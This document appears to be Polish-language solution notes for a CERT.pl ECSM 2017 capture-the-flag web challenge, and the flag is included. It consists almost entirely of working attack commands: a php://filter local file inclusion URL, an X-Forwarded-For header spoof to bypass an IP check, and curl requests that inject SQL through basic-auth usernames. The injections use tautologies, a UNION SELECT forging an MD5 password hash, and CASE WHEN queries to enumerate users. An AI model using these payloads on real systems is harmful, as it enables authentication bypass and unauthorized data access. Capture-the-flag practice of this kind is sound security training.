LFI: 
http://ecsm2017.cert.pl:6044/index.php/php://filter/convert.base64-encode/resource=instructions

1. request z określonego zakresu IP (line 9)
    linia 3: uzywa HTTP_X_FORWARDED_FOR

2. linia 22: SQLi z uzyciem $login z linii 17 
    trzeba wyslac naglowki PHP_AUTH_USER i PHP_AUTH_PW


1.

curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" http://ecsm2017.cert.pl:6044/index.php/instructions

curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user name:password  http://ecsm2017.cert.pl:6044/index.php/instructions

curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='1":password  http://ecsm2017.cert.pl:6044/index.php/instructions



2. pass authorization


curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions


3. dane o bazie

user: admin

curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='admin' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--":password  http://ecsm2017.cert.pl:6044/index.php/instructions


curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='Korg' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--":password  http://ecsm2017.cert.pl:6044/index.php/instructions

4. finalny request

curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'VeRySeCr3tAgent','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions

FLAGA:
ecsm{cyber.szpiegostwo}

